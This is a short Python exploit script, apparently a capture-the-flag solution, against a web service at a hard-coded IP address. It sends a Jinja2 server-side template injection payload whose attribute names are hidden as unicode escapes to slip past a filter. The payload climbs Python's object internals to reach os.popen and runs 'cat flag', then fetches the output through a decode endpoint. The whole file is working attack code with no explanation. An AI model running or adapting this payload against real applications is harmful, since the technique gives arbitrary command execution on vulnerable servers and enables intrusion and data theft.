import requests
import re

url = 'http://45.122.249.68:10011/'
res_regex = r'<p class="lead">(.*?)</p>'


def b64_encode():
    data = {'text':'{{"\\u0022\\u0022"|attr("\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f")|attr("\\u005f\\u005f\\u0062\\u0061\\u0073\\u0065\\u0073\\u005f\\u005f")|attr("\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f")(0)|attr("\\u005f\\u005f\\u0073\\u0075\\u0062\\u0063\\u006c\\u0061\\u0073\\u0073\\u0065\\u0073\\u005f\\u005f")()|attr("\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f")(132)|attr("\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f")|attr("\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f")|attr("\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f")("popen")("\\u0063\\u0061\\u0074\\u0020\\u0066\\u006c\\u0061\\u0067")|attr("read")()}}'}
    try:
        r = requests.post(url+'encode', data=data)
    except Exception as e:
        raise e
    str_encode = re.findall(res_regex,r.text)
    return str_encode[1]

def b64_decode():
    text = b64_encode()
    data = {'text':text}
    try:
        r = requests.post(url+'decode', data=data)
    except Exception as e:
        raise e
    print(r.text)

b64_decode()
